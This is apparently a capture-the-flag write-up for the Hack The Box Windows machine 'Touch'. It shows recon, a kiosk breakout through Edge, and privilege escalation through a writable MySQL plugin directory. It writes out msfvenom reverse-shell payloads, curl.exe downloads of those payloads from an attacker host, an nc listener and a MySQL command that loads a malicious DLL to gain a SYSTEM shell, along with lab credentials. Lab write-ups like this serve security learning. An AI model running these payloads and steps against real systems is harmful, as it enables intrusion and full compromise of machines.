# Touch




<img width="1585" height="280" alt="image" src="https://github.com/user-attachments/assets/85077655-bce9-476f-ac22-e43010f7c2d3" />

---


## nmap scan

```ruby
Nmap scan report for 10.129.209.73
Host is up (0.40s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Service
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Nexion DeviceHub - Login
|_Requested resource was /login
|_http-cors: GET POST PUT OPTIONS
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```


---

<img width="1918" height="720" alt="image" src="https://github.com/user-attachments/assets/c2ed429b-3df7-4a49-8cf8-bab36de17330" />

## i found in source code hint say 

> #### The default password is the device serial number included in your DeviceHub packaging

<img width="1918" height="444" alt="image" src="https://github.com/user-attachments/assets/f1205573-0086-49db-bd67-e7a4a3fe93fa" />

## found endpoint `/api` but i got `403` then i try fuzz and found `/api/status` 

<img width="1222" height="296" alt="image" src="https://github.com/user-attachments/assets/b44a5569-3ade-4d6f-a0cb-b4944048f212" />

````json
{
  "device": "Nexion DeviceHub DH-100",
  "serial": "NX-DH-2024-B7042",
  "firmware": "1.4.2",
  "status": "online",
  "uptime": 14564
}
````

## now let's login with serial number 

<img width="1919" height="841" alt="image" src="https://github.com/user-attachments/assets/04f5e7b6-93e2-4ffc-9e49-c9cf27055098" />



## Credentials Leaked in the Dashboard


|Item|Value|
|---|---|
|Scanner serial|`NX-SR-2024-0042`|
|Printer serial|`NX-TP-2024-0042`|
|**Username**|**`KioskUser`**|
|**Password**|**`K!0sk2026#`**|



## RDP access with KioskUser!

```
xfreerdp3 /u:KioskUser /p:'K!0sk2026#' /v:10.129.206.62 +clipboard /dynamic-resolution
```


<img width="1905" height="887" alt="image" src="https://github.com/user-attachments/assets/c377e4ee-d272-40e1-88e5-113b1f1dbf56" />



## login with `Jenny Crawford / KS7X2M`

<img width="1569" height="823" alt="image" src="https://github.com/user-attachments/assets/4edb26fa-1624-4d8b-a825-871ab65daa3b" />


## after login we moved to Passport Scanner 

<img width="1715" height="801" alt="image" src="https://github.com/user-attachments/assets/72e9e3ba-6da8-40ac-86fd-e7803193e456" />


## back into the DeviceHub admin panel (http://10.129.46.4:8443) and power OFF the DocReader and Printer services. 


<img width="1919" height="378" alt="image" src="https://github.com/user-attachments/assets/8a10725e-1ffe-4bc0-bf7b-0b3c16b0771d" />


##  now go back to RDP and click `scan badge` will found error click on link edge will be opened 

<img width="1485" height="850" alt="image" src="https://github.com/user-attachments/assets/95b685c0-6cc7-478d-a4cb-cf009fa70c04" />


## write in search 

```
file:///C:/Windows/System32/cmd.exe
```

<img width="1568" height="840" alt="image" src="https://github.com/user-attachments/assets/da57a1fc-aa6a-451e-b795-421ad8425a94" />

## click open and cmd will be opend now get user flag

<img width="1598" height="622" alt="image" src="https://github.com/user-attachments/assets/f2cd8263-f77d-4a07-8930-4c5092ea41be" />


## now enumrate system to privesc

```
whoami /priv
whoami /groups
```

```
KIOSK-042\Printer Administrators    Alias    ...     Enabled group
```


<img width="1667" height="558" alt="image" src="https://github.com/user-attachments/assets/7e72f5e7-d9da-418b-84b7-2c5037a9b886" />

## find Local services

``
netstat -ano | findstr LISTENING
``

<img width="1492" height="636" alt="image" src="https://github.com/user-attachments/assets/0049d5e8-6262-411d-be4a-1c4d216b1921" />



## Stabilizing the Shell


```
# payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.14 LPORT=4444 -f exe -o /tmp/shell.exe
cd /tmp
python3 -m http.server 8000

----

curl.exe http://10.10.16.14:8000/shell.exe -o shell.exe

```

<img width="1599" height="332" alt="image" src="https://github.com/user-attachments/assets/7751bb53-fccf-473c-baad-dd90898dc1a0" />




```
# run
C:\Users\KioskUser\Desktop\shell.exe

```



<img width="1549" height="312" alt="image" src="https://github.com/user-attachments/assets/9b379df5-b252-4c13-bfc9-b2dca944b384" />


```json
  TCP    127.0.0.1:3001         0.0.0.0:0              LISTENING       3912
  TCP    127.0.0.1:3306         0.0.0.0:0              LISTENING       3612
```


```
tasklist /svc /FI "PID eq 3612"
tasklist /svc /FI "PID eq 3912"
```

<img width="1029" height="300" alt="image" src="https://github.com/user-attachments/assets/b7b4dee6-d345-4ae3-b5e7-84c6fec20478" />

```
TCP 127.0.0.1:3001   — Node
TCP 127.0.0.1:3306   — MySQL
```

> #### A database running locally, reachable only from the box itself — we just need to find its credentials.

```
sc qc MySQL80
```

<img width="1127" height="323" alt="image" src="https://github.com/user-attachments/assets/e95f9c62-090a-42bf-af59-e59f3c48f94a" />

> MySQL runs as SYSTEM. 


```
icacls "C:\MySQL\bin"
```


<img width="1142" height="254" alt="image" src="https://github.com/user-attachments/assets/b7957d90-02c7-411d-95b5-b8590436cc7f" />


> ### `Authenticated Users` has **Modify** rights on the MySQL install directory — but the `MySQL80` service runs as `LocalSystem` and the current user cannot stop/start it (`Access Denied`). A simple binary-swap-and-restart won't work; we need a way to make MySQL load our code _while it's running_.




## after some digging found in `C:\ProgramData\HTB Airways`

```
04/04/2026  11:15 PM    <DIR>          .
04/04/2026  02:57 PM               286 db-config.ini
04/04/2026  02:52 PM            10,724 db-sync-replica.ps1
04/04/2026  07:34 PM               117 refresh-dates.bat
04/04/2026  11:58 PM             2,282 refresh-dates.sql
               4 File(s)         13,409 bytes
               1 Dir(s)   8,543,023,104 bytes free

```


## in `refresh-dates.bat` found Credintails

<img width="1098" height="131" alt="image" src="https://github.com/user-attachments/assets/7a8f207d-a6a8-4372-873f-0495ea850a96" />

```
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 < "C:\ProgramData\HTB Airways\refresh-dates.sql" 2>nul
```




| Ingredient                                                                              | w                                               |
| --------------------------------------------------------------------------------------- | ----------------------------------------------- |
| **MySQL runs as LocalSystem** ✅ (confirmed with `sc qc MySQL80`)                        | Anything MySQL loads into memory runs as SYSTEM |
| **The plugin directory is writable** ✅ (`C:\MySQL\lib\plugin` — Authenticated Users: M) | You can drop a file there                       |
| **MySQL root password** ✅ (`HTB@irw4ys_DB!2026`)                                        | You can make MySQL load your file               |

> ### **The exploit:** MySQL can load custom DLLs as "plugins" to add new SQL functions. When MySQL loads a DLL, Windows runs the DLL's `DllMain` function — which is arbitrary code. Since MySQL runs as SYSTEM, that code also runs as SYSTEM.



---

## Build the malicious DLL

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.14 LPORT=5555 -f dll -o /tmp/evil.dll

python3 -m http.server 8000
```


## start listener 

```
nc -lnvp 5555
```

## Download the DLL


```
curl.exe -o C:\MySQL\lib\plugin\evil.dll http://10.10.16.14:8000/evil.dll
dir C:\MySQL\lib\plugin\evil.dll
```

<img width="1166" height="157" alt="image" src="https://github.com/user-attachments/assets/42d234a0-3154-46f8-8d2d-e3e93099790b" />


## Trigger the Load

```
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 -e "CREATE FUNCTION sys_exec RETURNS INT SONAME 'evil.dll';"
```


<img width="1350" height="272" alt="image" src="https://github.com/user-attachments/assets/a4802d3c-de50-44a4-b4b8-7841e5d52f34" />


## get flag

<img width="1375" height="248" alt="image" src="https://github.com/user-attachments/assets/71d1c2a9-8f85-4ff6-89ed-d3cc1179ff30" />
















